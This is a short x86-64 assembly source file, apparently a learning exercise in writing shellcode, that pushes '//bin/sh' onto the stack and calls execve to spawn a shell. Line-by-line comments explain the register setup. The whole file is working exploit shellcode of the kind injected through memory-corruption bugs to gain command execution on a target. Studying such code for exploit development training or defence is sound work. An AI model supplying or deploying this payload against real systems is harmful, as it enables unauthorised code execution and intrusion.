BITS 64
global _start

_start:

xor rax, rax

push	rax 					; null terminator for the string
mov 	rbx, 0x68732f6e69622f2f ; //bin/sh backwards
push 	rbx 					;
mov 	rdi, rsp				; move address from stack pointer to first argument

push	rax
push	rdi						; actually we would not need this one
mov		rsi, rsp				; move the address to the 2nd argument

mov		rdx, rax				; no envp necessary

mov		al,0x3B					; execve into rax

syscall
